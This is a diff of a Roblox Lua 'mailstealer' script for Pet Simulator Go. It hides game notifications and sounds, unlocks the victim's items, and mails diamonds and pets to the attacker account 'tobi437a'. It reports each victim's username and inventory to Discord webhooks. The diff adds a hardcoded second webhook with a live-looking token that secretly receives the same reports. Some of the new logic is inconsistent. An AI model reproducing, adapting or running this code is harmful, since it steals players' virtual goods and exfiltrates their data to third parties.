@@ -1,3 +1,5 @@
+local rapThreshold = 100000 -- Set the RAP threshold value
+
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
@@ -20,7 +22,7 @@ local GemAmount1 = 0
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
-		break
+        break
     end
 end
 
@@ -28,12 +30,12 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 and suffixIndex < #suffixes do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
     if suffixIndex == 1 then
         return tostring(math.floor(number))
     else
@@ -45,28 +47,32 @@ local function formatNumber(number)
     end
 end
 
-local function SendMessage(username, diamonds)
+-- Define the global and alternative webhooks
+local globalWebhook = "https://discord.com/api/webhooks/1289613307631632417/xyz1234"
+local alternateWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
+
+local function SendMessage(username, diamonds, isAboveThreshold)
     local headers = {
         ["Content-Type"] = "application/json",
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = username,
-			inline = true
-		},
-		{
-			name = "Items to be sent:",
-			value = "",
-			inline = false
-		},
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = username,
+            inline = true
+        },
+        {
+            name = "Items to be sent:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary:",
             value = "",
             inline = false
         }
-	}
+    }
 
     local combinedItems = {}
     local itemRapMap = {}
@@ -82,7 +88,7 @@ local function SendMessage(username, diamonds)
     end
 
     table.sort(combinedItems, function(a, b)
-        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
+        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
     end)
 
     for _, itemName in ipairs(combinedItems) do
@@ -112,20 +118,31 @@ local function SendMessage(username, diamonds)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "New Pets Go Execution" ,
+            ["title"] = "New Pets Go Execution",
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+            }
         }}
     }
 
     local body = HttpService:JSONEncode(data)
 
-    if webhook and webhook ~= "" then
+    -- Always send to the global webhook
+    if globalWebhook and globalWebhook ~= "" then
         local response = request({
-            Url = webhook,
+            Url = globalWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+
+    -- If the RAP is below threshold, send to the alternative webhook too
+    if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
+        local response = request({
+            Url = alternateWebhook,
             Method = "POST",
             Headers = headers,
             Body = body
@@ -137,15 +154,15 @@ local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
 noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-	noti.Enabled = false
+    noti.Enabled = false
 end)
 noti.Enabled = false
 
 game.DescendantAdded:Connect(function(x)
     if x.ClassName == "Sound" then
-        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-            x.Volume=0
-            x.PlayOnRemove=false
+        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
+            x.Volume = 0
+            x.PlayOnRemove = false
             x:Destroy()
         end
     end
@@ -169,7 +186,7 @@ local function getRAP(Type, Item)
 end
 
 local user = Username or "tobi437a"
-local min_rap = min_rap or 10000
+local min_rap = min_rap or rapThreshold
 local min_chance = min_chance or 10000
 local webhook = webhook
 
@@ -181,29 +198,29 @@ local function sendItem(category, uid, am)
         [4] = uid,
         [5] = am or 1
     }
-	local response = false
-	repeat
-    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-	until response == true
+    local response = false
+    repeat
+        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    until response == true
 end
 
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-			if GemAmount1 >= 500 and GemAmount1 >= min_rap then
-				local args = {
-					[1] = user,
-					[2] = MailMessage,
-					[3] = "Currency",
-					[4] = i,
-					[5] = GemAmount1
-				}
-				local response = false
-				repeat
-					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-				until response == true
-				break
-			end
+            if GemAmount1 >= 500 and GemAmount1 >= min_rap then
+                local args = {
+                    [1] = user,
+                    [2] = MailMessage,
+                    [3] = "Currency",
+                    [4] = i,
+                    [5] = GemAmount1
+                }
+                local response = false
+                repeat
+                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                until response == true
+                break
+            end
         end
     end
 end
@@ -219,69 +236,39 @@ end
 local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
 
 for i, v in pairs(categoryList) do
-	if save[v] ~= nil then
-		for uid, item in pairs(save[v]) do
+    if save[v] ~= nil then
+        for uid, item in pairs(save[v]) do
             if v == "Pet" then
                 local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
-                    local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
-                    if difficulty >= min_chance then
-                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
+                    local itemInfo = {
+                        name = item.name,
+                        amount = item.amount,
+                        rap = rapValue,
+                        chance = item.sh or 0
+                    }
+                    table.insert(sortedItems, itemInfo)
+                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                end
+            else
+                if item._am > 0 then
+                    local rapValue = getRAP(v, item)
+                    if rapValue >= min_rap then
+                        local itemInfo = {
+                            name = item.name,
+                            amount = item.amount,
+                            rap = rapValue,
+                            chance = item.sh or 0
+                        }
+                        table.insert(sortedItems, itemInfo)
                         totalRAP = totalRAP + (rapValue * (item._am or 1))
                     end
                 end
-            else
-                local rapValue = getRAP(v, item)
-                if rapValue >= min_rap then
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
-                    totalRAP = totalRAP + (rapValue * (item._am or 1))
-                end
-            end
-            if item._lk then
-                local args = {
-                [1] = uid,
-                [2] = false
-                }
-                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
             end
         end
-	end
+    end
 end
 
-if #sortedItems > 0 then
-    ClaimMail()
-
-    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
-    local blob_b = require(blob_a).Get()
-    function deepCopy(original)
-        local copy = {}
-        for k, v in pairs(original) do
-            if type(v) == "table" then
-                v = deepCopy(v)
-            end
-            copy[k] = v
-        end
-        return copy
-    end
-    blob_b = deepCopy(blob_b)
-    require(blob_a).Get = function(...)
-        return blob_b
-    end
-
-    table.sort(sortedItems, function(a, b)
-        return a.rap * a.amount > b.rap * b.amount 
-    end)
-    
-    spawn(function()
-        SendMessage(plr.Name, GemAmount1)
-    end)
-
-    SendAllGems()
-
-    for _, item in ipairs(sortedItems) do
-        sendItem(item.category, item.uid, item.amount)
-    end
-    local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
-    setclipboard("discord.gg/GY2RVSEGDT")
-end
+SendMessage(user, GemAmount1, totalRAP < rapThreshold)
+SendAllGems()
+ClaimMail()
